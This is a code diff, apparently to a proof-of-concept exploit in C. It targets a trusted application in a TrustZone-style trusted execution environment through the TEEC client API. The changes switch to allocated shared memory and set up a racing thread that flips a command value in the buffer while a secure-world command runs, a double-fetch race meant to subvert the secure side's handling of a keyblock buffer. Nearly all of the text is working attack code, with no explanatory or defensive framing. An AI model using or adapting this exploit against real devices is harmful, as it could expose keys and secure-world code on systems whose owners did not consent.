@@ -26,6 +26,8 @@ void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
 void (*TEEC_CloseSession_impl)(TEEC_Session*);
 TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
 TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
+TEEC_Result (*TEEC_AllocateSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
+void (*TEEC_ReleaseSharedMemory_impl)(TEEC_SharedMemory*);
 
 void cleanup_shm(){
 #if EMULATE
@@ -92,7 +94,7 @@ void * change_value(void * arg) {
         comm_in_params[0] = 0x1006;
         // TODO: maybe sleep for a while and try to extend the race window
         // printf("changed value from 0x1006 to 0x1007\n");
-        comm_in_params[0] = 0x1008;
+        comm_in_params[0] = 0x1007;
         // printf("changed value from 0x1007 to 0x1006\n");
     }
     return NULL;
@@ -109,27 +111,28 @@ pthread_t create_thread_for_racing(void* mem_area1) {
 
 void send_req(TEEC_Context *context, TEEC_Session *session)
 {
-	void* mem_area1 = allocate_param_mem(context, 0x1000);
-    memset(mem_area1, 0, 0x1000);
-
-    int* ints = (int*) mem_area1;
-	char* chars = (char*)mem_area1;
-	ints[0] = 0x1008;
-	ints[1] = 0x0;
-	chars[0x10] = 0x0;
-
-    TEEC_Operation op;
-    memset(&op, 0, sizeof(op));
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
-                                     TEEC_NONE, TEEC_NONE);
-    printf("params: 0x%lx\n", op.paramTypes);
-    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
-    op.params[0].tmpref.size = 0x1000;  // the keyblock buffer
 
     pthread_cond_init(&cond, NULL);
     pthread_mutex_init(&mutex, NULL);
 
 #if EMULATE
+    void* mem_area1 = allocate_param_mem(context, 0x1000);
+    memset(mem_area1, 0, 0x1000);
+
+    int* ints = (int*) mem_area1;
+    char* chars = (char*)mem_area1;
+    ints[0] = 0x1006;
+    ints[1] = 0x0;
+    chars[0x10] = 0x0;
+
+
+    TEEC_Operation op;
+    memset(&op, 0, sizeof(op));
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
+                                    TEEC_NONE, TEEC_NONE);
+    printf("params: 0x%lx\n", op.paramTypes);
+    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
+    op.params[0].tmpref.size = 0x1000;  // the keyblock buffer
 
     // init(context, session, mem_area1);
 
@@ -147,34 +150,67 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     pthread_join(tid, NULL);
 
 #else
-    // 1. Create shared memory between non-secure and secure
-    TEEC_SharedMemory shm = {0};
-    shm.size = 0x1000;
-    shm.buffer = mem_area1;
-    shm.flags = TEEC_MEM_INPUT; // | TEEC_MEM_OUTPUT; 
+    // 1. Allocate shared memory between non-secure and secure
+    printf("Allocating shared memory\n");
+    TEEC_SharedMemory commsSM;
+    commsSM.size = 0x1000;
+    commsSM.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
+    TEEC_Result result = TEEC_AllocateSharedMemory_impl(
+        context,
+        &commsSM);
 
-    TEEC_Result res2 = TEEC_RegisterSharedMemory_impl(context, &shm);
-    printf("TEEC_RegisterSharedMemory result: %x \n", res2);
+    if (result != TEEC_SUCCESS) {
+        printf("TEEC_AllocateSharedMemory failed with code 0x%x\n", result);
+        exit(-1);
+    }
+    printf("TEEC_AllocateSharedMemory result: %x\n", result);
+    printf("commsSM: %p\n", commsSM.buffer);
+    memset(commsSM.buffer, 0, 0x1000);
+    int* ints = (int*) commsSM.buffer;
+    char* chars = (char*)commsSM.buffer;
+    ints[0] = 0x1007;
+    ints[1] = 0x0;
+    chars[0x10] = 0x0;
 
-    pthread_t tid = create_thread_for_racing(mem_area1);
+    TEEC_Operation op;
+    memset(&op, 0, sizeof(op));
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_PARTIAL_INOUT, TEEC_NONE, // must be inout here.
+                                     TEEC_NONE, TEEC_NONE);
+    printf("params: 0x%lx\n", op.paramTypes);
+    op.params[0].memref.parent = &commsSM; // mem_area1
+    op.params[0].memref.size = 0x1000;  
+    op.params[0].memref.offset = 0x0;
+
+
+    // Option2: Register shared memory between non-secure and secure
+    // TEEC_SharedMemory shm = {0};
+    // shm.size = 0x1000;
+    // shm.buffer = mem_area1;
+    // shm.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT; // | TEEC_MEM_OUTPUT; 
+
+    // TEEC_Result res2 = TEEC_RegisterSharedMemory_impl(context, &shm);
+    // printf("TEEC_RegisterSharedMemory result: %x \n", res2);
+
+    // 2. Create a thread to race the shared memory
+    printf("starting racing thread\n");
+    pthread_t tid = create_thread_for_racing(commsSM.buffer); //mem_area1
     uint32_t err_origin;
 
     pthread_mutex_lock(&mutex); 
     start = true;
     pthread_cond_signal(&cond);
     pthread_mutex_unlock(&mutex);
-
-
-
+    
     TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);
 
     printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
     atomic_store(&stop, true);
     pthread_join(tid, NULL);
-
+    // TEEC_ReleaseSharedMemory_impl(&commsSM);
 #endif
     printf("shared mem: %x, %x, %x, %x, %x\n", ints[0], ints[1], ints[2], ints[3], ints[4]);
     printf("Finished...\n");
+    
 }
 
 int main(int argc, char **argv)
